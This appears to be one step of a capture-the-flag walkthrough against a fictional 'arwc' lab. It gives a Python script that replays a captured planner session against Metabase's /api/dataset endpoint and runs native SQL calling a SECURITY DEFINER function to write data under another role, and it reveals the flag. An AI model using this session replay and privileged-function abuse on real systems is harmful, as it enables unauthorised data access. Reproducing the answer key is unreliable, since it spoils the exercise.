Requires W07.2 (adjustment record read) and W09.4 (process_session). Call the SECURITY DEFINER function `arwc_reconcile_copy('REC-CRR-DP3-17')` through the native Metabase `/api/dataset` endpoint. The function runs as `planning_reader` and writes `REC-CRR-DP3-17-COPY` into `reconciliation_copy`.

The route is `planning.query-run` in the planning client document. It points to `https://reports.arwc.test/api/dataset`. Use the planner session from W06.3 as the `X-Metabase-Session` header. The corporate-db database id is `2` ("ARWC approved planning reports"). The function returns the columns `copy_id, copy_revision, copy_source, copy_identity, flag`, so select them directly; no UNION is needed.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

# Get the planning.query-run route template (points to Metabase /api/dataset).
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client", headers=h),
    context=ctx).read())
query_run_url = next(r["template"] for r in doc["routes"] if r["key"] == "planning.query-run")
# query_run_url = https://reports.arwc.test/api/dataset

# The planner session from W06.3 is the Metabase session ID.
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

sql = "SELECT copy_id, copy_revision, copy_source, copy_identity, flag FROM arwc_reconcile_copy('REC-CRR-DP3-17')"
body = json.dumps({"database": 2, "type": "native", "native": {"query": sql}}).encode()
result = json.loads(urllib.request.urlopen(
    urllib.request.Request(query_run_url, data=body, headers=mb_h, method="POST"),
    context=ctx, timeout=30).read())

cols = [c["name"] for c in result["data"]["cols"]]
copy = dict(zip(cols, result["data"]["rows"][0]))
print("copy_id:", copy["copy_id"])          # REC-CRR-DP3-17-COPY
print("identity:", copy["copy_identity"])   # planning_reader
print("flag:", copy["flag"])                # FLAG{9f7a03ecbffb3005}
```

The function runs under `planning_reader` (SECURITY DEFINER) and writes `REC-CRR-DP3-17-COPY` into `reconciliation_copy`. Calling it again increments the revision. The flag is in the `flag` column of the returned record.

Flag: `FLAG{9f7a03ecbffb3005}` in the `flag` column of the function result.
